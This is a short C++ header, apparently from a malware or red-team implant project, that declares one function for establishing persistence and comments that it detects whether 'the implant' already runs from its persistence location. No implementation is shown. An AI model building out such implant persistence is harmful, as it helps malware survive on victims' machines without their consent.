#pragma once

namespace persistence {

// Establishes persistence.
// Returns true if this is the first run and persistence was just installed.
// Returns false if the implant is already running from its persistence location.
bool establishPersistence();

} // namespace persistence
